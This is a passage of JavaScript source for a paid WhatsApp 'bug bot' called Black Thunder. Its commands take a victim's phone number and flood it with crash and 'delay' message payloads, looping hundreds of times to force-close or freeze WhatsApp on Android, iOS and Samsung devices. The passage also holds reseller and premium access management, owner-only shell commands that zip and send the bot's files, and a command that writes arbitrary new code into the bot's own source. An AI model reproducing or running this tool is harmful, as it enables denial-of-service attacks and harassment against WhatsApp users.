    for (let i = 0; i < tolbug; i++) {      
       await bulldozer5GB(langgxyz, target)
       await ChronosDelay(target, true)
       await carouselNew(target)
       await protocolbug7(target, true)
       await carouselNew(target)
       await carouselNew(target)
    }
} 

async function SasukeDelay(target) {
    for (let i = 0; i < tolbug; i++) {
       await protocolbug7(target, true)
       await protocolbug7(target, true)
       await protocolbug7(target, true)
       await protocolbug5v2(target, true)
       await protocolbug5v2(target, true)
       await protocolbug5v2(target, false)
       await protocolbug5v2(target, false)
       await carouselNew(target)
    }
} 

async function SasukeBuldozer(target) {
    for (let i = 0; i < tolbug; i++) {
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
    }
} 

// Combo Dengan True Dan False
async function SasukeDelayInvis(target) {
    for (let i = 0; i < tolbug2; i++) {
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await protocolbug7(target, true)
       await protocolbug7(target, true)
       await protocolbug7(target, true)
       await protocolbug7(target, true)
       await protocolbug7(target, false)
       await protocolbug7(target, false)
    }
} 
// Combo buldozerXProtoaudii
async function SasukeComboSetan(target) {
    for (let i = 0; i < tolbug2; i++) {
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await bulldozer5GB(target)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
       await ProtoXAudio(target, true)
    }
}         

// Auto Vn
let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
await langgxyz.sendPresenceUpdate(jd, from) // HAPUS UNTUK MEMATIKAN
}

        switch (command) {
        
case "bugmenu": {
langgxyz.sendMessage(m.chat, { react: { text: "☠️", key: m.key } });

let mbut = `
Hi I Am BlackThunder Bot Designed To Help Use Or Send The Latest WhatsApp System!!
Developer DayzxOfficial

  ⚡Black Thunder⚡
[ ♢ ] Bot Information ♔
◎ Bot Name : Black Thunder☯️
◎ Creator : DayzxDeveloper
◎ Version : Gen 1 V1
◎ Type : Case
◎ Prefix : multi
◎ Status : ${langgxyz.public ? "Public" : "Self"}


[ ♢ ] Bug Menu Pilihan ♔
◇ .dayzx-ultimate 62xxx

[ ♢ ] Bug Group ♔
◇ .bug-group

[ ♢ ] Bug Menu Crash ♔
◇ .crashui 628xxx
◇ .fcandro 628xxx
◇ .fcbeta 628xxx
◇ .fcios 628xxx
◇ .killch #Gunakan Dalam Ch
◇ .crashsamsung 628xxx

[ ♢ ] Bug Menu Delay ♔
◇ .delayiosmarker 628xxx
◇ .delaynew
◇ .crashcombo
◇ .delayandroid 628xxx
◇ .buldozer 628xxx

[ ♢ ] Bug Menu Emoji ♔
◇ .delayiosmarker 628xxx
◇ .buldozer 628xxx

[ ♢ ] Bug Emoji ♔
◇ .😂 62xxx
◇ .🤓 62xxx
◇ .😝 62xxx
◇ .😹 62xxx

© Dayzx Official 🩸
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: mbut,
  footer: "Developer Dayzx",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Black Thunder Gen 1 Vvip`,
            "body": `© Erlangga Dayzx`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Dayzx Official`,
           "thumbnail": fs.readFileSync('./assest/allmedia/erlangga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A5txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".tqto", 
    buttonText: { 
      displayText: 'tqto' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
  },
     {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "Menu Owner"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: PayX })
}
                break
case "menu":{

langgxyz.sendMessage(m.chat, { react: { text: "〽️", key: m.key } });
let mbut = `
Hi I Am Black Thunder Bot Designed To Help Use Or Send The Latest WhatsApp System!!
Developer DayzxOfficial

   ⚡Black Thunder⚡
[ ♢ ] Bot Information ♔
◎ Bot Name : Black Thunder☯️
◎ Creator : Dayzx Developer
◎ Version : Gen 1 V1
◎ Type : Case
◎ Prefix : multi
◎ Status : ${langgxyz.public ? "Public" : "Self"}
`

    const flowActions = [
        {
            buttonId: 'action',
            buttonText: { displayText: 'Sellect Type Menu' },
            type: 4,
            nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                    title: "Message",
                    sections: [
                        {
                            title: "Attack Menu",
                            highlight_label: "Rekomendasi",
                            rows: [
                                { title: "Bugmenu", description: "Bug Menu Black Thunder", id: `.bugmenu` },
                                 { title: "Ownermenu", description: "Menampilkan Owner Menu", id: `.ownermenu` }  
                             ]
                               }, 
                            {
                            title: "Funny Menu",
                            highlight_label: "Powered By Dayzx Official",
                            rows: [
                                { title: "Fun Menu", description: "Menampilkan Fun Menu", id: `.funmenu` },
                                { title: "Group Menu", description: "Menampilkan Fun Menu", id: `.grupmenu` }
                            ]
                        },
                          {
                            title: "Store Menu",
                            highlight_label: "Rekomendasi",
                            rows: [
                            { title: "Jb Menu", description: "Menampilkan Fun Menu", id: `.jbmenu` }, 
                                { title: "Create Pterodactyl", description: "Menampilkan Fun Menu", id: `.cpanelmenu` }
                     ]
                   },
                    {
                            title: "",
                            highlight_label: "Powered By Dayzx Official",
                            rows: [
                                { title: "© Black", description: " Menampilkan Thanks To", id: `tqto` }
                     ]
                   }
                 ]
              })
            },
            viewOnce: true
        }
    ];

    let buttonMessage = {
       image: poto, 
        caption: mbut,
        contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
        showAdAttribution: false,
        renderLargerThumbnail: false,
        title: `Black Thunder`,
        body: `Gen 1 Vvip🐉〽️`,
        previewType: "VIDEO",
        thumbnail: marga,
        sourceUrl: `https://github.com/erlangga050809`,
        mediaUrl: `https://wa.me/6282122680598`
        }
       },
        footer: "© Dayzx Official 🐉〽️",
        buttons: flowActions,
        viewOnce: true,
        headerType: 1
 };

await langgxyz.sendMessage(m.chat, buttonMessage, { quoted: qmime });
}
break

case "ownermenu": {
let babi = `
 *Haii @${m.sender.split("@")[0]}

  ➤  ｢ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ｣ 
 → Creator : Dayzx Official
 → Action : https://ẉ.ceo/DayzxDeveloper
 → Version : Gen 1 Vq1
 → Status : Vip Buy Only!
 → TipeMenu : Button
 → Status : ${langgxyz.public ? "Public" : "Self"}

╭─❍ *OWNER MENU*
│ ▢ .slidebutton
│ ▢ .menuv2
│ ▢ .addowner
│ ▢ .delowner
│ ▢ .buttonoff
│ ▢ .buttonon
│ ▢ .addmurbug
│ ▢ .delmurbug
│ ▢ .addreseller
│ ▢ .delreseller
│ ▢ .addaksesgc
│ ▢ .delaksesgc
│ ▢ .listakses
│ ▢ .debug
│ ▢ .self
│ ▢ .public
│ ▢ .addcase
│ ▢ .getcase
│ ▢ .clearsession
│ ▢ .buatgc
│ ▢ $
│ ▢ >
╰──────────────
`;
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: babi,
  footer: "Developer Dayzx",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Black ThunderGen 1 Vvip`,
            "body": `© Dayzx Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Dayzx Official`,
            "thumbnail": fs.readFileSync('./assest/allmedia/erlangga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A5txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".cpanelmenu", 
    buttonText: { 
      displayText: 'Panel Menu' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break 
case 'dayzx-ultimate': {
 langgxyz.sendMessage(m.chat, { react: { text: "💢", key: m.key } });
 
if (!isPremium) return ErlanggaReply("*You are not a Premium User*");
    if (!q) return ErlanggaReply("Example Usage:\n .dayzx-ultimate 62xx / @tag");

    let org = q.replace(/[^0-9]/g, "");
    
    if (org.startsWith('0')) {
        return ErlanggaReply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .dayzx-ultimatev2 62 xxx-xxxx-xxxx`);
    }

    let pepec = `${org}@s.whatsapp.net`;
    
  langgxyz.sendMessage(m.chat, {
  caption: "Dayzx Developer", 
  image: marga,
  footer: "BlackTh Gen 1 Vvip",
  buttons: [
    { 
      buttonId: `.script`, 
      buttonText: {
      displayText: 'Buy Script'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.owner', 
      buttonText: {
      displayText: 'owner'
      }, 
      type: 1,
      viewOnce: true
    },
    { 
      buttonId: '.h kontol', 
      buttonText: {
      displayText: 'Ping' 
      }, 
      type: 4, 
      nativeFlowInfo: {
    name: 'single_select', 
    paramsJson: `{
        "title": "Are you ready?̰̜͉͔̽͢",
        "sections": [
            {
                "title": "© DayzxOfficial",
                "highlight_label": "",
                "rows": [
                    {
                        "header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Ui",
                        "description": "Attack Ui",
                        "id": ".crashui ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Delay Invis+Maker",
                        "description": "invis 90%",
                        "id": ".buldozer ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Crash New",
                        "description": "",
                        "id": ".delaynew ${pepec}"
                    },
                      {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Fc Beta",
                        "description": "Attack Beta",
                        "id": ".fcbeta ${pepec}"
                    },
                     {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "All Device fc wa",
                        "description": "kill semua no yang ada di dalam ch",
                        "id": ".killch ${pepec}"
                    },
                      {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Bug Crash Samsung",
                        "description": "",
                        "id": ".crashsamsung ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "Send Spam Pairing",
                        "description": "Spam Pairing",
                        "id": ".delayandroid ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "for close whatsapp",
                        "description": "Forclose New",
                        "id": ".fcandro ${pepec}"
                    },
                    {
                        header": "𝐅𝐨𝐫 𝐀𝐧𝐝𝐫𝐨𝐢𝐝",
                        "title": "fc Ios",
                        "description": "Fc For Device Ios",
                        "id": ".fcios ${pepec}"
                    }                                                  
                ]
            }
        ]
    }`
},
      viewOnce: true
    }
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qmime });
}
break
case 'betacrash': case 'fcbeta':{
if (!isCreator && isPremium) return ErlanggaReply(mess.murbug)
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim Pesan Proccess 
let halahnyocot = `
*Succes Send Bug To ${org}*\n
*Command*:
${command} for ${org}
> Jeda 10 menit, gak jeda?karepmu kenon tanggung sndri
`
langgxyz.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
  caption: halahnyocot,
  footer: "Sasuke Gen 8 Vvip",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418898701072@newsletter",
      serverMessageId: 1,
      newsletterName: "Erlangga Official Solo Era"
    }
  }
}, { quoted: qmime });
      
       await SasukeForcloseNew(org);
       await sleep(2000);
       for (let i = 0; i < 50; i++) {   
       await payoutzep(org);
       await vcardcrash(org);           
        }
  } 
  break                              
case 'fcandro': case 'newslettercombo': case 'crashbusinnes':{
if (!isCreator && isPremium) return ErlanggaReply(mess.murbug)
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 // Kirim Pesan Proccess 
let halahnyocot = `
*Succes Send Bug To ${org}*\n
*Command*:
${command} for ${org}
> Jeda 10 menit, gak jeda?karepmu kenon tanggung sndri
`
langgxyz.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
  caption: halahnyocot,
  footer: "Sasuke Gen 8 Vvip",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418898701072@newsletter",
      serverMessageId: 1,
      newsletterName: "Erlangga Official Solo Era"
    }
  }
}, { quoted: qmime });

       await SasukeForcloseNew(org);
       await sleep(2000);
       for (let i = 0; i < 777; i++) {   
        await protocolbug7(org, true);
        await carouselNew(org);      
        }
  } 
  break
case 'buldozer':{
if (!isCreator && isPremium) return ErlanggaReply(mess.murbug)
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
// Kirim Pesan Proccess 
let halahnyocot = `
*Succes Send Bug To ${org}*\n
*Command*:
.${command} for ${org}
> Jeda 10 menit, gak jeda?karepmu kenon tanggung sndri
`
langgxyz.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
  caption: halahnyocot,
  footer: "Sasuke Gen 8 Vvip",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418898701072@newsletter",
      serverMessageId: 1,
      newsletterName: "Erlangga Official Solo Era"
    }
  }
}, { quoted: qmime });
       
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       await SasukeBuldozer(org)
       for (let i = 0; i < 999; i++) {   
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await protocolbug5(org, true)
       await bulldozer5GB(org)
       await protocolbug5(org, true)
        }
  } 
  break 
case 'delaystuck': case 'crashui':{
if (!isCreator && !isPremium) return ErlanggaReply(mess.murbug);
if (!text) {
return await langgxyz.sendMessage(m.chat, { text: `Example: .${command} 628XXX` });
    }
const target = text.trim();
const org = target.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
// Kirim Pesan Proccess 
let halahnyocot = `
*Succes Send Bug To ${org}*\n
*Command*:
.${command} for ${org}
> Jeda 10 menit, gak jeda?karepmu kenon tanggung sndri
`
langgxyz.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/ggjkbc.jpg" },
  caption: halahnyocot,
  footer: "Sasuke Gen 8 Vvip",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363418898701072@newsletter",
      serverMessageId: 1,
      newsletterName: "Erlangga Official Solo Era"
    }
  }
}, { quoted: qmime });

       // Memulai Pemanggilan 1 Func Fc Kemudian Combo Dengan Func Delay
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelayNew(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelay(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       await SasukeDelayInvis(org)
       for (let i = 0; i < 777; i++) {
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, true)
       await protocolbug5v2(org, false)
       await protocolbug5v2(org, false)
       }
  } 
  break 
case "addmurbug":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return ErlanggaReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return ErlanggaReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./assest/database/premium.json", JSON.stringify(premium))
ErlanggaReply(`Nomor ${anj} Telah Menjadi murbug!`)
}
break
case 'delmurbug': {
    if (!isCreator) return ErlanggaReply("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲");
    if (args.length < 1) return ErlanggaReply(`Use :\n*#delmurbug* @tag\n*#delmurbug* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getPremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("../assest/database/premium.json", JSON.stringify(premium));
        }
        ErlanggaReply("Delete success");
    } else {
        premium.splice(getPremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("../assest/database/premium.json", JSON.stringify(premium));
        ErlanggaReply("Success");
    }
}
break
case "addreseller":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return ErlanggaReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return ErlanggaReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
reseller.push(anj)
fs.writeFileSync("./assest/database/premium.json", JSON.stringify(reseller))
ErlanggaReply(`Nomor ${anj} Telah Menjadi murbug!`)
}
break
case 'delreseller': {
    if (!isCreator) return ErlanggaReply("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲");
    if (args.length < 1) return ErlanggaReply(`Use :\n*#dellresellee* @tag\n*#delreseller* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            reseller.splice(getResellerPosition(m.mentionedJid[i], reseller), 1);
            fs.writeFileSync("../assest/database/premium.json", JSON.stringify(reseller));
        }
        ErlanggaReply("Delete success");
    } else {
        reseller.splice(getResellerPosition(args[0] + "@s.whatsapp.net", reseller), 1);
        fs.writeFileSync("../assest/database/premium.json", JSON.stringify(reseller));
        ErlanggaReply("Success");
    }
}
break
            case "self":{
                if (!isCreator) return ErlanggaReply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = false
                ErlanggaReply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return ErlanggaReply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = true
                ErlanggaReply(`successfully changed to ${command}`)
            }
            break           
              case "backup":{
if (!isCreator) return ErlanggaReply(mess.owner);
const { execSync } = require("child_process");
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await langgxyz.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
break
      case 'script': case 'sc': {
let buy = `
*\`▧ 「 SCRIPT BKACK THUNDER」\`*
╭────────────────━
┃友 *\`MAU BELI SC INI?\`*
┃
┃- *BLACK THUNDER Gen 1 Vvip?*
┃
┃友 *Chat 1 : wa.me/6282122680598*
┃友 *Telegram : https://t.me/DayzxOfficial1*
╰────────────────━`
langgxyz.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 50000000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
}
break        
    case 'tqto': {
let buy = `
╭─❍ *TQTO FOR*
│ Dayzx Official *[Developer]*
│ Erlangga Official ( base )
│ Yukina Devils ( funct )
│ Ortu ( support )
│ Allah ( maha pencipta,maha agung)
╰──────────────`
langgxyz.sendMessage(m.chat, {
  image: poto,
  caption: buy,
  footer: "Developer Dayzx",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Black Thunder Gen 1 Vvip`,
            "body": `© Dayzx Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Dayzx Official`,
            "thumbnail": fs.readFileSync('./assest/allmedia/erlangga.jpg'),
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: qmime })
}
break
                break                               
case 'addcase': {
 if (!isCreator) return ErlanggaReply('lu sapa asu')
 if (!text) return ErlanggaReply('Mana case nya');
    const fs = require('fs');
const namaFile = 'erlangga.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                ErlanggaReply('Terjadi kesalahan saat menulis file:', err);
            } else {
                ErlanggaReply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        ErlanggaReply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
 case "sendsc": {
  if (!isCreator) return ErlanggaReply('*Fitur Ini Khusus Bang Erlangga*')
  
  if (!args[0]) return ErlanggaReply(example("628xxx"));
  
  let targetNumber = args[0]
  if (!targetNumber.startsWith('62')) return ErlanggaReply(example("628xxx"))
  
  await ErlanggaReply("Memproses pengiriman script bot")
  var name = `Sasuke-Crash-Gen8`
  
  const ls = (await execSync("ls"))
    .toString()
    .split("\n")
    .filter(
      (pe) =>
        pe != "node_modules" &&
        pe != "session" &&
        pe != "package-lock.json" &&
        pe != "yarn.lock" &&
        pe != ""
    )
    
  const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
  
  await langgxyz.sendMessage(`${targetNumber}@s.whatsapp.net`, {
    document: await fs.readFileSync(`./${name}.zip`),
    fileName: `${name}.zip`,
    mimetype: "application/zip"
  }, {quoted: m })
  
  await execSync(`rm -rf ${name}.zip`)
  
  return ErlanggaReply(`*Script bot berhasil dikirim ke nomor*\n *📞 ${targetNumber}*`)
}
break
 case 'owner': {
    langgxyz.sendMessage(m.chat, { react: { text: "👤", key: m.key } });

    let menu = `
*👋 Hi ${pushname} Ini Adalah Owner Black Thunder Mohon Jangan Spam!!*
    `;

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    contextInfo: {
                        mentionedJid: [m.sender], 
                        isForwarded: true, 
                        forwardedNewsletterMessageInfo: {
                            newsletterName: `Channel Dayzx Official`,
                            newsletterJid: "1203634172881399ewsletter",
                            serverMessageId: 143
                        },
                        businessMessageForwardInfo: { businessOwnerJid: langgxyz.decodeJid(langgxyz.user.id) },
                    }, 
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: menu
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: "Erlangga Official"
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6282122680598\",\"merchant_url\":\"https://wa.me/6282122680598\"}`
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"Saluran Developer\",\"url\":\"https://whatsapp.com/channel/0029Vb4mdpCHDymFEKsWI2r/989\",\"merchant_url\":\"https://wa.me/6282122680598\"}`
                            }
                        ],
                    })
                })
            }
        }
    }, {});

    await langgxyz.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break;
case "getcase": {
if (!isCreator) return ErlanggaReply(mess.owner)
if (!text) return ErlanggaReply(example("menu"))
const getcase = (cases) => {
return "case "+`\"${cases}\"`+fs.readFileSync('./start/erlangga.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
ErlanggaReply(`${getcase(text)}`)
} catch (e) {
return ErlanggaReply(`Case *${text}* Tidak Ditemukan`)
}
}
break  
                case "delowner":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return ErlanggaReply(`Example Use :\n${prefix+command} 62xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = creator.indexOf(ya)
creator.splice(unp, 1)
fs.writeFileSync("../assest/database/owner.json", JSON.stringify(creator))
ErlanggaReply(`Sussces Del Owner ${no}`)
}
break
case "addowner":{
if (!isCreator) return ErlanggaReply(mess.owner)
if (!args[0]) return ErlanggaReply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(prrkek)
if (ceknya.length == 0) return ErlanggaReply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
creator.push(prrkek)
fs.writeFileSync("../assest/database/owner.json", JSON.stringify(creator))
ErlanggaReply(`*\`${prrkek} SUKSES MENJADI OWNER!!\`*`)
}
break

case "h":
            case "hidetag": {
                if (!m.isGroup) return ErlanggaReply(mess.group)
                if (!isAdmins && !isCreator) return Reply(mess.admin)
 if (!q) return Reply(`Teks nya mana dongo`);
                if (m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    langgxyz.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: m })
                }
            }
            break
               
        case 'debug': {
            if (!isCreator) return ErlanggaReply(mess.owner)
            if (!m.quoted) return ErlanggaReply('Reply Message!')
            await SasukeDebug(quoted);
        }
        break;

        case "cekidch":
        case "idch": {
            if (!text) return ErlanggaReply(example("linkchnya"))
            if (!text.includes("https://whatsapp.com/channel/")) return ErlanggaReply("Link tautan tidak valid")
            let result = text.split('https://whatsapp.com/channel/')[1]
            let res = await langgxyz.newsletterMetadata("invite", result)
            let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
            let msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [{
                                    "name": "cta_copy",
                                    "buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
                                }]
                            })
                        })
                    }
                }
